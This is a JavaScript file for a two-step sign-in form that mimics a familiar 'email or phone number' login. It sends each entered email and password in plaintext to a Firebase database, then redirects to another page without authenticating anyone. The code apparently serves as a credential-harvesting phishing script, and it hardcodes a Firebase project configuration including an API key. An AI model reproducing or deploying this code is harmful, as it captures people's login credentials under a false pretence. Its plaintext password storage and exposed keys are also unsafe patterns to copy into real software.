// Import Firebase modules (using modular Firebase)
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
  authDomain: "django-eb349.firebaseapp.com",
  databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "django-eb349",
  storageBucket: "django-eb349.appspot.com",
  messagingSenderId: "271670409370",
  appId: "1:271670409370:web:51498b4b417669173f8723"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// DOM Elements
const emailStep = document.querySelector('.step-email');
const passwordStep = document.querySelector('.step-password');
const emailField = document.getElementById('email');
const passwordField = document.getElementById('password');
const nextBtn = document.getElementById('nextBtn');
const signInBtn = document.getElementById('signInBtn');

// Step 1: Handle "Next" button for email
nextBtn.addEventListener('click', function () {
  const email = emailField.value.trim();

  if (email === '') {
    alert('Please enter an email or phone number.');
    emailField.focus();
    return;
  }

  // Save email to Firebase
  saveEmail(email)
    .then(() => {
      console.log('Email saved successfully in Firebase!');
      // Show password step
      emailStep.classList.add('hidden');
      passwordStep.classList.remove('hidden');
    })
    .catch(error => {
      console.error('Error saving email to Firebase:', error);
      alert('Failed to save email. Please try again.');
    });
});

// Step 2: Handle "Sign In" button for password
signInBtn.addEventListener('click', function () {
  const password = passwordField.value.trim();

  if (password === '') {
    alert('Please enter your password.');
    passwordField.focus();
    return;
  }

  // Save password to Firebase
  savePassword(password)
    .then(() => {
      console.log('Password saved successfully in Firebase!');
      // Redirect to the main index page
      window.location.href = 'index.html';
    })
    .catch(error => {
      console.error('Error saving password to Firebase:', error);
      alert('Failed to save password. Please try again.');
    });
});

// Function to save email to Firebase
function saveEmail(email) {
  const userRef = ref(database, 'users/email');
  return set(userRef, { email: email });
}

// Function to save password to Firebase
function savePassword(password) {
  const userRef = ref(database, 'users/password');
  return set(userRef, { password: password });
}
